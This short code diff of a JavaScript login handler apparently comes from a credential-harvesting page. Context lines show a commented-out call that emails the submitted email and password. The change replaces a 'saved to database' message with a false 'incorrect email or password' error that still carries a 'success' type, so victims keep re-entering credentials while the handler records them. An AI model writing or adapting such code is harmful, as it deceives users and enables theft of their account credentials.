@@ -20,7 +20,7 @@ exports.submitLogin = async (req, res) => {
     // await sendLoginEmail({ email, password });
 
     return res.render("login", { 
-      message: "Login request saved to database successfully!", 
+      message: "incorrect email or password! please input correct details.", 
       messageType: "success" 
     });
   } catch (error) {
